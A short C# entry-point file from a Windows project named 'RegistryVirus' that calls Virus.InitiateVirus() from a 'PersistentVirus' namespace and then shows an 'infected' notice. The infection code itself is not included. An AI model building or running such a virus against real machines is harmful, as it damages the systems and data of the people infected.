using PersistentVirus;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RegistryVirus
{
    internal static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Virus.InitiateVirus();
            MessageBox.Show("Congrats, you got infected!", "Infection Notice", MessageBoxButtons.OK, MessageBoxIcon.Warning);
        }
    }
}
